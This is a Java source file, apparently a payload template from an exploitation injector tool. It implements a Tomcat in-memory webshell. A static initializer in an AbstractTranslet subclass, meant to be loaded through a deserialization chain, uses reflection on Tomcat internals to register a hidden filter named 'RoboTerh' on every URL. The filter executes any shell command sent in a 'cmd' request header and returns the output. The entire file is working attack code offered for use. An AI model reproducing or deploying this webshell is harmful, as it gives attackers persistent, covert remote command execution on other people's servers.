package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.ApplicationContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;


import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.Scanner;

public class TomcatFilterTemplate extends AbstractTranslet {

    static {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
                lastServicedResponseField.set(null, new ThreadLocal<>());
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            } else {
                ServletRequest servletRequest = lastServicedRequest.get();
                ServletContext servletContext = servletRequest.getServletContext();

                String name = "RoboTerh";
                //从request中获取ServletContext

                //从context中获取ApplicationContext对象
                Field appctx = servletContext.getClass().getDeclaredField("context");
                appctx.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

                //从ApplicationContext中获取StandardContext对象
                Field stdctx = applicationContext.getClass().getDeclaredField("context");
                stdctx.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

                //从StandardContext中获得filterConfigs这个map对象
                Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);

                //如果这个过滤器名字没有注册过
                if (filterConfigs.get(name) == null) {
                    //自定义一个Filter对象
                    Filter filter = new Filter() {
                        @Override
                        public void init(FilterConfig filterConfig) throws ServletException {

                        }

                        @Override
                        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                            HttpServletRequest req = (HttpServletRequest) servletRequest;
                            HttpServletResponse resp = (HttpServletResponse) servletResponse;
                            if (req.getHeader("cmd") != null) {
                                PrintWriter writer = resp.getWriter();
                                String cmd = req.getHeader("cmd");
                                String[] commands = new String[3];
                                String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
                                if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                                    commands[0] = "cmd";
                                    commands[1] = "/c";
                                } else {
                                    commands[0] = "/bin/sh";
                                    commands[1] = "-c";
                                }
                                commands[2] = cmd;
                                try {
                                    writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
                                    writer.getClass().getDeclaredMethod("flush").invoke(writer);
                                    writer.getClass().getDeclaredMethod("close").invoke(writer);
                                    return;
                                } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
                                    e.printStackTrace();
                                }

                            }
                            filterChain.doFilter(servletRequest, servletResponse);
                        }

                        @Override
                        public void destroy() {

                        }

                    };

                    //创建FilterDef对象 并添加 filter对象，filtername, filter类
                    FilterDef filterDef = new FilterDef();
                    filterDef.setFilter(filter);
                    filterDef.setFilterName(name);
                    filterDef.setFilterClass(filter.getClass().getName());
                    //通过addFilterDef方法添加 filterDef 方法
                    standardContext.addFilterDef(filterDef);

                    //创建FilterMap对象，并添加 filter映射，filtername
                    FilterMap filterMap = new FilterMap();
                    filterMap.addURLPattern("/*");
                    filterMap.setFilterName(name);
                    //这个不要忘记了
                    filterMap.setDispatcher(DispatcherType.REQUEST.name());

                    //通过addFilterMapBefore方法添加filterMap对象
                    standardContext.addFilterMapBefore(filterMap);

                    //通过前面获取的filtermaps的put方法放入filterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                    filterConfigs.put(name, filterConfig);
                }
            }
        } catch (Exception e) {
            // ignore
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
